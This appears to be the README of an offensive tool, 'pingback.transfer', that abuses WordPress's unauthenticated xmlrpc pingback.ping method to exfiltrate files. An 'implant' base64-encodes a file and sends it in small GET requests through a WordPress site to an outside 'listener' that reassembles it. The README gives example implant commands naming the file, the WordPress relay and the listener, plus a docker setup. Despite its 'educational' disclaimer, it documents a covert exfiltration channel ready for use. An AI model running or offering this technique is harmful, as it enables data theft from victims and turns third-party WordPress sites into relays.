# pingback.transfer
Tech demo of using WordPress' built in xmlrpc - pingback.ping to transfer files!


## Installation
This is only needed for the listener. Implant _should_ work with standard python libs.
```shell
pip install -r requirements.txt
```

## Usage -- implant
NOTE: **The listener must be on before running the implant.**

Only "small" files are supported. You can try big ones too, but it can be unreliable. My testing worked with 1.5mb, at the very least. If the connection is unstable, you're trying to send a lot of data, or what ever it may be and need to tweak the file chunk size: `-c` flag is your friend! My testing only worked up to 4500, so 4000 is set as the "safe default"

Example commands:
```shell
python3 "./implant.py" -f "<FILE>" -w "<WP>" -l "<LISTENER>"

python3 "./implant.py" -f "./input/demo.png" -w "http://192.168.113.74/" -l "http://192.168.0.2:5500/listener/"

python3 "./implant.py" -f "./input/demo.png" -w "http://192.168.113.74/" -l "http://192.168.0.2:5500/listener/" -c 560
```

## Usage -- listener
Start with:
```shell
python3 listener.py
```

## Don't have a WordPress? No problem!
You can use the `docker-compose.yml` to create a WordPress site. It will have pingback enabled by default. Run with command:
`docker-compose up -d && docker-compose logs -f`

## Explanation

"pingback.ping is a method used in WordPress for pingback notifications between websites that support pingbacks. When you link to a post or page on another WordPress site, and that site also supports pingbacks, WordPress will attempt to notify that site that you've linked to them."

The pingback method can be used even when unauthorized, and it makes an webrequest to an arbitary address. This GET webrequest can then be used for various things, here it's used to relay information. 

This is a tech demo of using those GET requests to send files.

Data is read from a file on the implant side, and then base64 encoded and sent through multiple small GET requests to the listener, which then decodes the data and writes it to a file. Implant files should be in the "input" folder, and listener will write all the files into "output" folder.

# NOTES

Due to the nature of this tech demo, there are some quirks. For example, if a file already exists, or the chunksize is too small, files may be corrupted or lost in transit. I will not be held responsible for any and all damages caused by running this code.

Important: This project is intended for educational and lawful purposes only. The author and contributors are not responsible for any misuse or illegal activities that may arise from using this software. By using this software, you agree to comply with all applicable laws and regulations. If you are uncertain about the legality of your actions, please seek legal advice before proceeding. The author and contributors disclaim any and all liability for any direct, indirect, or consequential loss or damage arising from your use of the software. Use this software at your own risk.

Thank you for your understanding and cooperation.